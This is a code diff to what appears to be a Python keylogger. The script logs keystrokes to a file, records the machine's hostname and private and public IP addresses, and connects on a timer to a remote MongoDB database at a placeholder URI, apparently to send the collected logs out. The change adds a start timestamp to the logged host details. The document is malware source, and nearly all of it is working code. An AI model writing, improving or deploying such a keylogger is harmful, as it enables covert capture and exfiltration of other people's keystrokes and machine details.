@@ -35,8 +35,9 @@ external_ip = "N/A"
 # formats messages and keylogs in ascending time order
 logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format = '%(asctime)s: %(message)s:')
 
-def writeFile(host_name, host_ip, external_ip):
+def writeFile(start_time, host_name, host_ip, external_ip):
     with open(log_dir + "key_log.txt", "a") as myfile:
+            myfile.write("Start Time: " + start_time + "\n")
             myfile.write("Hostname: " + host_name + "\n")
             myfile.write("Private IP: " + host_ip + "\n")
             myfile.write("Public IP: " + external_ip + "\n")
@@ -45,16 +46,18 @@ def writeFile(host_name, host_ip, external_ip):
 # IP address 
 def get_Host_name_IP(): 
     try: 
+        start_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         host_name = socket.gethostname() 
         host_ip = socket.gethostbyname(host_name)
         external_ip = ipgetter.myip()
+        print("Start Time:", start_time)
         print("Hostname:", host_name) 
         print("Private IP:", host_ip)
         print("Public IP:", external_ip) 
-        writeFile(host_name, host_ip, external_ip)
+        writeFile(start_time, host_name, host_ip, external_ip)
     except: 
         print("Unable to get Hostname and IP") 
-        writeFile(host_name, host_ip, external_ip)
+        writeFile(start_time, host_name, host_ip, external_ip)
 
 # Driver code 
 get_Host_name_IP() # Function call 
@@ -67,7 +70,7 @@ def set_interval(func, sec):
     t.start()
     return t
 
-uri = "MONGODB_URI" # I use mlab
+uri = "MONGODB_URI"
 
 client = MongoClient(uri,
         connectTimeoutMS=30000,
